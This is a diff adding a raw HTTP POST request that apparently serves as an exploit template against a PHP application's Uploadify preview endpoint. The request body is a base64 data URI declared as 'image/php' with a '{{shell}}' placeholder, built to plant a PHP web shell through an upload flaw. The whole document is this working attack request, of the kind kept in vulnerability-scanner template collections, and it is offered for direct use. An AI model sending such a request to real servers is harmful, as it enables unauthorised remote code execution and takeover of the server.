@@ -1,0 +1,6 @@
+POST /index.php?m=Home&c=Uploadify&a=preview&num=1&input=head_pic&path=head_pic&func=add_img HTTP/1.1
+Host: 172.16.0.200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+data:image/php;base64,{{shell}}
